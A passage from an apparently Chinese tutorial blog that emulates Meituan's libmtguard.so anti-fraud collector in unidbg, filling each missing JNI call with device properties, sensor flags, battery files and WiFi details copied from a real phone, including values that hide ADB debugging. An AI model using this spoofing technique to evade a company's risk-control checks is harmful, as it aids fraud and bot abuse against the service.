[arm64-v8a][ro.product.cpu.abilist]: [arm64-v8a,armeabi-v7a,armeabi][ro.product.cpu.abilist32]: [armeabi-v7a,armeabi][ro.product.cpu.abilist64]: [arm64-v8a]</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getSysProp(Ljava/lang/String;)Ljava/lang/String;&quot;:&#123;    String name = vaList.getObjectArg(0).getValue().toString();    System.out.println(&quot;getSysProp:&quot;+name);    if(name.equals(&quot;ro.product.cpu.abi&quot;))&#123;        return new StringObject(vm, &quot;arm64-v8a&quot;);    &#125;    throw new UnsupportedOperationException(signature);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">[!] getSysProp: ro.product.cpu.abi2[15:58:21 719]  WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=-452987096, svcNumber=0x120, PC=unidbg@0xfffe0294, LR=RX@0x12018613[libmtguard.so]0x18613, syscall=nulljava.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getSysProp(Ljava/lang/String;)Ljava/lang/String;at com.test4.TEST4.callObjectMethodV(TEST4.java:274)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>我的测试机就一个分区，所以用 adb 指令查不到，那么直接返回空字符串就好</p><pre><code class="language-Java">else if(name.equals(&quot;ro.product.cpu.abi2&quot;)) &#123;    return new StringObject(vm, &quot;&quot;);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/os/Build-&gt;PRODUCT:Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:103)at com.test4.TEST4.getStaticObjectField(TEST4.java:386)at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:53)</code></pre><p>接连着的是 PRODUCT、HARDWARE、DEVICE，依次补环境</p><pre><code class="language-Java">case &quot;android/os/Build-&gt;PRODUCT:Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;missi&quot;);&#125;case &quot;android/os/Build-&gt;HARDWARE:Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;mt6893&quot;);&#125;case &quot;android/os/Build-&gt;DEVICE:Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;ares&quot;);&#125;</code></pre><p>穿插</p><pre><code class="language-shell">[!] getSysProp: ro.build.product[16:04:14 251]  WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=-452987096, svcNumber=0x120, PC=unidbg@0xfffe0294, LR=RX@0x1201831f[libmtguard.so]0x1831f, syscall=nulljava.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getSysProp(Ljava/lang/String;)Ljava/lang/String;at com.test4.TEST4.callObjectMethodV(TEST4.java:277)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>显然又是所谓的多重校验，多个 API 获取相同信息</p><p>然后又是 HOST 和 ID</p><pre><code class="language-Java">case &quot;android/os/Build-&gt;HOST:Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;c4-xm-ota-bd093.bj&quot;);&#125;case &quot;android/os/Build-&gt;ID:Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;SP1A.210812.016&quot;);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/os/Build$VERSION-&gt;RELEASE:Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:103)at com.test4.TEST4.getStaticObjectField(TEST4.java:405)at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:53)at com.github.unidbg.linux.android.dvm.DvmField.getStaticObjectField(DvmField.java:106)</code></pre><p>在 adb 中找到</p><pre><code class="language-shell">[ro.build.version.release]: [12]</code></pre><p>然后补环境，继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/lang/Integer-&gt;toString(I)Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:504)at com.test4.TEST4.callStaticObjectMethodV(TEST4.java:327)at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:438)</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;java/lang/Integer-&gt;toString(I)Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, Integer.toString(vaList.getIntArg(0)));&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/content/Context-&gt;getResources()Landroid/content/res/Resources;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:284)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)</code></pre><p>Resources 即资源，看来是新的逻辑。</p><pre><code class="language-Java">case &quot;android/content/Context-&gt;getResources()Landroid/content/res/Resources;&quot;:&#123;    return vm.resolveClass(&quot;android/content/res/Resources&quot;).newObject(null);&#125;</code></pre><p>继续运行，发现原来是想获取配置信息</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/content/res/Resources-&gt;getConfiguration()Landroid/content/res/Configuration;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:286)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;android/content/res/Resources-&gt;getConfiguration()Landroid/content/res/Configuration;&quot;:&#123;    return vm.resolveClass(&quot;android/content/res/Configuration&quot;).newObject(null);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/content/res/Configuration-&gt;locale:Ljava/util/Locale;at com.github.unidbg.linux.android.dvm.AbstractJni.getObjectField(AbstractJni.java:171)at com.test4.TEST4.getObjectField(TEST4.java:299)at com.github.unidbg.linux.android.dvm.AbstractJni.getObjectField(AbstractJni.java:141)</code></pre><p>具体而言，是获取区域信息，locale在 JDK 里也有，所以改用 createObject。</p><pre><code class="language-Java">case &quot;android/content/res/Configuration-&gt;locale:Ljava/util/Locale;&quot;:&#123;    return ProxyDvmObject.createObject(vm, Locale.getDefault());&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/os/Build-&gt;TAGS:Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:103)at com.test4.TEST4.getStaticObjectField(TEST4.java:421)at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:53)at com.github.unidbg.linux.android.dvm.DvmField.getStaticObjectField(DvmField.java:106)</code></pre><p>ADB grep 一下，ro.build.tags 的值是 release-keys。</p><pre><code class="language-shell">ares:/ $ getprop | grep tags[debug.atrace.tags.enableflags]: [0][ro.bootimage.build.tags]: [release-keys][ro.build.tags]: [release-keys][ro.product.build.tags]: [release-keys][ro.system.build.tags]: [release-keys][ro.system_ext.build.tags]: [release-keys][ro.vendor.build.tags]: [release-keys][ro.vendor_dlkm.build.tags]: [release-keys]</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;android/os/Build-&gt;TAGS:Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;release-keys&quot;);&#125;</code></pre><p>继续运行，</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/os/Build-&gt;FINGERPRINT:Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:103)at com.test4.TEST4.getStaticObjectField(TEST4.java:424)at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:53)at com.github.unidbg.linux.android.dvm.DvmField.getStaticObjectField(DvmField.java:106)</code></pre><p>接下来是 FINGERPRINT、TYPE。</p><pre><code class="language-Java">case &quot;android/os/Build-&gt;FINGERPRINT:Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;redmi/missi/missi:12/SP1A.210812.016/V13.0.8.0.SKJCNXM:user/release-keys&quot;);&#125;case &quot;android/os/Build-&gt;TYPE:Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;user&quot;);&#125;</code></pre><p>运行，又是 getSysProp</p><pre><code class="language-shell">[!] getSysProp: ro.build.description[16:53:59 982]  WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=-452987096, svcNumber=0x120, PC=unidbg@0xfffe0294, LR=RX@0x1200ca17[libmtguard.so]0xca17, syscall=nulljava.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getSysProp(Ljava/lang/String;)Ljava/lang/String;at com.test4.TEST4.callObjectMethodV(TEST4.java:282)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>adb 获取一下信息，然后补环境</p><pre><code class="language-shell">ares:/ $ getprop | grep ro.build.description[ro.build.description]: [missi-user 12 SP1A.210812.016 V13.0.8.0.SKJCNXM release-keys]</code></pre><p>继续补环境</p><pre><code class="language-Java">else if(name.equals(&quot;ro.build.description&quot;))&#123;    return new StringObject(vm, &quot;missi-user 12 SP1A.210812.016 V13.0.8.0.SKJCNXM release-keys&quot;);&#125;</code></pre><p>运行，还是 getSysProp 调用，参数是 ro.secure</p><pre><code class="language-Java">else if(name.equals(&quot;ro.secure&quot;))&#123;    return new StringObject(vm, &quot;1&quot;);&#125;</code></pre><p>继续，接着是 ro.debuggable</p><pre><code class="language-Java">if(name.equals(&quot;ro.debuggable&quot;))&#123;    return new StringObject(vm, &quot;0&quot;);&#125;</code></pre><p>运行代码，得出结果。</p><pre><code class="language-shell">[*] getHWProperty: mt6893|Xiaomi|Redmi|M2012K10C|arm64-v8a|-|missi|mt6893|ares|missi|c4-xm-ota-bd093.bj|SP1A.210812.016|12|35|zh|CN|release-keys|redmi/missi/missi:12/SP1A.210812.016/V13.0.8.0.SKJCNXM:user/release-keys|user|missi-user 12 SP1A.210812.016 V13.0.8.0.SKJCNXM release-keys|1|0|</code></pre><h3 id="九、getHWStatus"><a href="#九、getHWStatus" class="headerlink" title="九、getHWStatus"></a>九、getHWStatus</h3><p>发起调用</p><pre><code class="language-Java">public String getHWStatus()&#123;    String result = SIUACollector.callJniMethodObject(emulator, &quot;getHWStatus()Ljava/lang/String;&quot;).getValue().toString();    return result;&#125;</code></pre><p>开始补环境</p><pre><code class="language-shell">[!] getSysProp: persist.sys.usb.config[17:04:12 708]  WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=-452987096, svcNumber=0x120, PC=unidbg@0xfffe0294, LR=RX@0x12023a11[libmtguard.so]0x23a11, syscall=nulljava.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getSysProp(Ljava/lang/String;)Ljava/lang/String;at com.test4.TEST4.callObjectMethodV(TEST4.java:297)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)at com.github.unidbg.linux.android.dvm.DalvikVM$33.handle(DalvikVM.java:578)</code></pre><p>这是在获取设备是否连接了 ADB，因此返回空字符串为好，接连三个都是类似的属性。</p><pre><code class="language-Java">if(name.equals(&quot;persist.sys.usb.config&quot;))&#123;    return new StringObject(vm, &quot;&quot;);&#125;if(name.equals(&quot;sys.usb.config&quot;))&#123;    return new StringObject(vm, &quot;&quot;);&#125;if(name.equals(&quot;sys.usb.state&quot;))&#123;    return new StringObject(vm, &quot;&quot;);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/content/pm/PackageManager-&gt;hasSystemFeature(Ljava/lang/String;)Zat com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:625)at com.test4.TEST4.callBooleanMethodV(TEST4.java:351)at com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:603)at com.github.unidbg.linux.android.dvm.DvmMethod.callBooleanMethodA(DvmMethod.java:124)at com.github.unidbg.linux.android.dvm.DalvikVM$36.handle(DalvikVM.java:655)</code></pre><p>查询可知，<strong>hasSystemFeature</strong> 用于确认设备是否有特定的功能模块，打印参数看看</p><pre><code class="language-Java">case &quot;android/content/pm/PackageManager-&gt;hasSystemFeature(Ljava/lang/String;)Z&quot;:&#123;    String name = vaList.getObjectArg(0).getValue().toString();    System.out.println(&quot;check hasSystemFeature:&quot;+name);&#125;</code></pre><p>发现是检测是否存在加速度传感器</p><pre><code class="language-shell">check hasSystemFeature:android.hardware.sensor.accelerometer</code></pre><p>返回 True，继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;boolean2Integer(Z)Iat com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:563)at com.test4.TEST4.callIntMethodV(TEST4.java:400)at com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:529)at com.github.unidbg.linux.android.dvm.DvmMethod.callIntMethodA(DvmMethod.java:134)</code></pre><p><strong>jadx</strong> 查看对应伪代码</p><pre><code class="language-Java">private int boolean2Integer(boolean z) &#123;         return z ? 1 : 0;&#125;</code></pre><p>很简单，直接补环境</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;boolean2Integer(Z)I&quot;: &#123;                return vaList.getIntArg(0);            &#125;</code></pre><p>然后运行，发现又检测了不少传感器和硬件支持，参考文章中补了下面这么多，但是我并没有补这么多</p><pre><code class="language-Java">case &quot;android/content/pm/PackageManager-&gt;hasSystemFeature(Ljava/lang/String;)Z&quot;:&#123;    String name = vaList.getObjectArg(0).getValue().toString();    System.out.println(&quot;check hasSystemFeature:&quot;+name);    switch (name)&#123;            // 检测加速传感器        case &quot;android.hardware.sensor.accelerometer&quot;:&#123;            return true;        &#125;            // 检测陀螺仪传感器        case &quot;android.hardware.sensor.gyroscope&quot;:&#123;            return true;        &#125;            // wifi        case &quot;android.hardware.wifi&quot;:&#123;            return true;        &#125;            // 蓝牙        case &quot;android.hardware.bluetooth&quot;:&#123;            return true;        &#125;            // 蓝牙低功耗        case &quot;android.hardware.bluetooth_le&quot;:&#123;            return true;        &#125;            // 电话        case &quot;android.hardware.telephony&quot;:&#123;            return true;        &#125;            // USB 配件API        case &quot;android.hardware.usb.accessory&quot;:&#123;            return true;        &#125;            // gps        case &quot;android.hardware.location.gps&quot;:&#123;            return true;        &#125;            // nfc        case &quot;android.hardware.nfc&quot;:&#123;            return true;        &#125;    &#125;&#125;</code></pre><pre><code class="language-Java">case &quot;android/content/pm/PackageManager-&gt;hasSystemFeature(Ljava/lang/String;)Z&quot;: &#123;                String name = vaList.getObjectArg(0).getValue().toString();                System.out.println(&quot;[!] Check hasSystemFeature: &quot; + name);                switch (name) &#123;                    // 检测加速度传感器                    case &quot;android.hardware.sensor.accelerometer&quot;: &#123;                        return true;                    &#125;                    // 检测陀螺仪传感器                    case &quot;android.hardware.sensor.gyroscope&quot;: &#123;                        return true;                    &#125;                &#125;            &#125;</code></pre><p>在这个过程中，也还涉及到其他的几个补环境</p><pre><code class="language-shell">[!] getSysProp: gsm.version.baseband[17:27:30 570]  WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=-452987096, svcNumber=0x120, PC=unidbg@0xfffe0294, LR=RX@0x12024d7f[libmtguard.so]0x24d7f, syscall=nulljava.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getSysProp(Ljava/lang/String;)Ljava/lang/String;at com.test4.TEST4.callObjectMethodV(TEST4.java:306)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)at com.github.unidbg.linux.android.dvm.DalvikVM$33.handle(DalvikVM.java:578)</code></pre><p>也还是和之前一样补一下</p><pre><code class="language-Java">else if (name.equals(&quot;gsm.version.baseband&quot;)) &#123;                    return new StringObject(vm, &quot;MOLY.NR15.R3.TC8.PR2.SP.V2.1.P23,MOLY.NR15.R3.TC8.PR2.SP.V2.1.P23&quot;);                &#125;                else if (name.equals(&quot;gsm.version.ril-impl&quot;)) &#123;                    return new StringObject(vm, &quot;android reference-ril 1.0&quot;);                &#125;                else if (name.equals(&quot;gsm.sim.state&quot;)) &#123;                    return new StringObject(vm, &quot;ABSENT,ABSENT&quot;);                &#125;                else if (name.equals(&quot;gsm.sim.state.2&quot;)) &#123;                    return new StringObject(vm, &quot;&quot;);                &#125;                else if (name.equals(&quot;wifi.interface&quot;)) &#123;                    return new StringObject(vm, &quot;&quot;);                &#125;</code></pre><p>还有一些其他类型的错误</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/io/File-&gt;allocObjectat com.github.unidbg.linux.android.dvm.AbstractJni.allocObject(AbstractJni.java:812)at com.test4.TEST4.allocObject(TEST4.java:122)at com.github.unidbg.linux.android.dvm.DvmClass.allocObject(DvmClass.java:74)at com.github.unidbg.linux.android.dvm.DalvikVM$24.handle(DalvikVM.java:365)</code></pre><p>和之前一样处理</p><pre><code class="language-Java">case &quot;java/io/File-&gt;allocObject&quot;: &#123;                return dvmClass.newObject(signature);            &#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/io/File-&gt;&lt;init&gt;(Ljava/lang/String;)Vat com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:1007)at com.test4.TEST4.callVoidMethodV(TEST4.java:167)at com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:990)</code></pre><p>和先前一样，用全局变量处理，因为担心会初始化多个文件，所以命名为 file1</p><pre><code class="language-Java">public class TEST4 extends AbstractJni implements IOResolver &#123;    private final AndroidEmulator emulator;    private final DvmObject&lt;?&gt; SIUACollector;    private final VM vm;    public FileInputStream fileInputStream;    public InputStreamReader inputStreamReader;    public BufferedReader bufferedReader;    public File file1;</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;java/io/File-&gt;&lt;init&gt;(Ljava/lang/String;)V&quot;:&#123;    String path = vaList.getObjectArg(0).getValue().toString();    System.out.println(&quot;filePath:&quot;+path);&#125;</code></pre><p>运行</p><pre><code class="language-shell">filePath:/sys/class/power_supply/battery/voltage_now</code></pre><p>这是电池信息有关的文件</p><pre><code class="language-shell">1|ares:/ $ suares:/ # cat /sys/class/power_supply/battery/voltage_now4227000</code></pre><p>在 Unidbg 中建立对应的文件，补环境，重定向</p><pre><code class="language-Java">case &quot;java/io/File-&gt;&lt;init&gt;(Ljava/lang/String;)V&quot;:&#123;    String path = vaList.getObjectArg(0).getValue().toString();    System.out.println(&quot;filePath:&quot;+path);    if(path.equals(&quot;/sys/class/power_supply/battery/voltage_now&quot;))&#123;        file1 = new File(&quot;unidbg-android/src/test/resources/dianping/files/voltage_now&quot;);        return;    &#125;&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/io/File-&gt;exists()Zat com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:625)at com.test4.TEST4.callBooleanMethodV(TEST4.java:391)at com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:603)</code></pre><p>继续补环境</p><pre><code class="language-Java">case &quot;java/io/File-&gt;exists()Z&quot;:&#123;    return file1.exists();&#125;</code></pre><p>直接返回 true 也行，因为这里判断的就是我们刚处理的 file1 是否存在。<br>运行，然后样本又开始处理另一个文件</p><pre><code class="language-shell">Filepath: /sys/class/power_supply/battery/temp[17:52:27 885]  WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=-452987096, svcNumber=0x13b, PC=unidbg@0xfffe0444, LR=RX@0x12026601[libmtguard.so]0x26601, syscall=nulljava.lang.UnsupportedOperationException: java/io/File-&gt;&lt;init&gt;(Ljava/lang/String;)Vat com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:1007)at com.test4.TEST4.callVoidMethodV(TEST4.java:176)at com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:990)</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;java/io/File-&gt;&lt;init&gt;(Ljava/lang/String;)V&quot;: &#123;                String path = vaList.getObjectArg(0).getValue().toString();                System.out.println(&quot;Filepath: &quot; + path);                if (path.equals(&quot;/sys/class/power_supply/battery/voltage_now&quot;)) &#123;                    file1 = new File(&quot;unidbg-android/src/test/java/com/test4/voltage_now&quot;);                    return;                &#125;                else if (path.equals(&quot;/sys/class/power_supply/battery/temp&quot;)) &#123;                    file2 = new File(&quot;unidbg-android/src/test/java/com/test4/temp&quot;);                    return;                &#125;            &#125;</code></pre><p>继续运行，得到结果</p><pre><code class="language-shell">[*] getHWStatus: -|-|-|1|1|MOLY.NR15.R3.TC8.PR2.SP.V2.1.P23,MOLY.NR15.R3.TC8.PR2.SP.V2.1.P23|android reference-ril 1.0|ABSENT,ABSENT|-|1|1|1|-|1|1|1|1|1|1|1|</code></pre><h3 id="十、getLocationInfo"><a href="#十、getLocationInfo" class="headerlink" title="十、getLocationInfo"></a>十、getLocationInfo</h3><p>发起调用</p><pre><code class="language-Java">public String getLocationInfo()&#123;    String result = SIUACollector.callJniMethodObject(emulator, &quot;getLocationInfo()Ljava/lang/String;&quot;).getValue().toString();    return result;&#125;</code></pre><p>运行，报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/net/wifi/WifiManager-&gt;getConnectionInfo()Landroid/net/wifi/WifiInfo;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:353)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;android/net/wifi/WifiManager-&gt;getConnectionInfo()Landroid/net/wifi/WifiInfo;&quot;:&#123;    return vm.resolveClass(&quot;android/net/wifi/WifiInfo&quot;).newObject(signature);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/net/wifi/WifiInfo-&gt;getSSID()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:356)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)</code></pre><p>Google 的这个API 的作用是获取 WiFi 名，查看手机所连接的 WiFi 名，做补环境</p><pre><code class="language-java">case &quot;android/net/wifi/WifiInfo-&gt;getSSID()Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;DX-MOBILE&quot;);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/lang/String-&gt;equalsIgnoreCase(Ljava/lang/String;)Zat com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:625)at com.test4.TEST4.callBooleanMethodV(TEST4.java:412)at com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:603)</code></pre><p>正常补环境</p><pre><code class="language-Java">case &quot;java/lang/String-&gt;equalsIgnoreCase(Ljava/lang/String;)Z&quot;:&#123;    return dvmObject.getValue().toString().equalsIgnoreCase(vaList.getObjectArg(0).getValue().toString());&#125;</code></pre><p>报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/lang/String-&gt;equals(Ljava/lang/Object;)Zat com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:625)at com.test4.TEST4.callBooleanMethodV(TEST4.java:415)at com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:603)</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;java/lang/String-&gt;equals(Ljava/lang/Object;)Z&quot;:&#123;    return dvmObject.getValue().toString().equals(vaList.getObjectArg(0).getValue().toString());&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/lang/String-&gt;length()Iat com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:563)at com.test4.TEST4.callIntMethodV(TEST4.java:457)at com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:529)</code></pre><p>依旧正常补环境</p><pre><code class="language-Java">case &quot;java/lang/String-&gt;length()I&quot;: &#123;    return dvmObject.getValue().toString().length();&#125;</code></pre><p>运行，继续报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/lang/StringBuilder-&gt;append(Ljava/lang/CharSequence;II)Ljava/lang/StringBuilder;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:359)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)</code></pre><p>这个稍微有点复杂</p><pre><code class="language-Java">case &quot;java/lang/StringBuilder-&gt;append(Ljava/lang/CharSequence;II)Ljava/lang/StringBuilder;&quot;: &#123;                // 参数                CharSequence csq = (CharSequence) vaList.getObjectArg(0).getValue();                int start = vaList.getIntArg(1);                int end = vaList.getIntArg(2);                // 构造新内容                StringBuilder currentValue = (StringBuilder) dvmObject.getValue();                StringBuilder sb = new StringBuilder(currentValue);                sb.append(csq.subSequence(start, end));                // 返回新的 StringBuilder 对象（因为 setValue() 不能直接改）                return vm.resolveClass(&quot;java/lang/StringBuilder&quot;).newObject(sb);            &#125;</code></pre><p>不过一步一步拆开来写就好了。然后继续运行，报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/net/wifi/WifiInfo-&gt;getBSSID()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:373)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)</code></pre><p>上网查了下这个 API 的功能，是获取 WiFi 接入点的唯一标识符，一般就是路由器无线网卡的 MAC 地址</p><p>。一样采用写一个 demo 的方式来获取这个值</p><pre><code class="language-Java">        // 检查并申请 Wi-Fi 和定位权限        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED ||                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_WIFI_STATE) != PackageManager.PERMISSION_GRANTED) &#123;            ActivityCompat.requestPermissions(this,                    new String[]&#123;                            Manifest.permission.ACCESS_FINE_LOCATION,                            Manifest.permission.ACCESS_WIFI_STATE                    &#125;, PERMISSION_REQUEST_CODE);        &#125; else &#123;            getBssid();        &#125;    &#125;    // 获取 BSSID    private void getBssid() &#123;        WifiManager wifiManager = (WifiManager) getSystemService(WIFI_SERVICE);        if (wifiManager != null) &#123;            WifiInfo wifiInfo = wifiManager.getConnectionInfo();            if (wifiInfo != null &amp;&amp; wifiInfo.getBSSID() != null) &#123;                Log.e(&quot;当前BSSID&quot;, wifiInfo.getBSSID());            &#125; else &#123;                Log.e(&quot;当前BSSID&quot;, &quot;无法获取BSSID，权限不足或未连接Wi-Fi&quot;);            &#125;        &#125;    &#125;    // 处理运行时权限回调    @Override    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,                                           @NonNull int[] grantResults) &#123;        super.onRequestPermissionsResult(requestCode, permissions, grantResults);        if (requestCode == PERMISSION_REQUEST_CODE) &#123;            boolean granted = true;            for (int res : grantResults) &#123;                if (res != PackageManager.PERMISSION_GRANTED) &#123;                    granted = false;                    break;                &#125;            &#125;            if (granted) &#123;                getBssid();            &#125; else &#123;                Log.e(&quot;当前BSSID&quot;, &quot;权限被拒绝，无法获取BSSID&quot;);            &#125;        &#125;    &#125;</code></pre><p>稍微有点复杂，因为需要申请权限。然后我获取的值是 3c:d2:e5: ab:81:b1。补环境</p><pre><code class="language-Java">            case &quot;android/net/wifi/WifiInfo-&gt;getBSSID()Ljava/lang/String;&quot;: &#123;                return new StringObject(vm, &quot;3c:d2:e5:ab:81:b1&quot;);            &#125;</code></pre><p>继续</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/net/wifi/WifiInfo-&gt;getRssi()Iat com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:563)at com.test4.TEST4.callIntMethodV(TEST4.java:477)at com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:529)</code></pre><p>这个 API 是用来获取 WiFi 信号强度的，也可以使用 上面的方法 来获取，当然也可以随意返回一个正常的值也可以</p><pre><code class="language-Java">WifiManager wifiManager = (WifiManager) 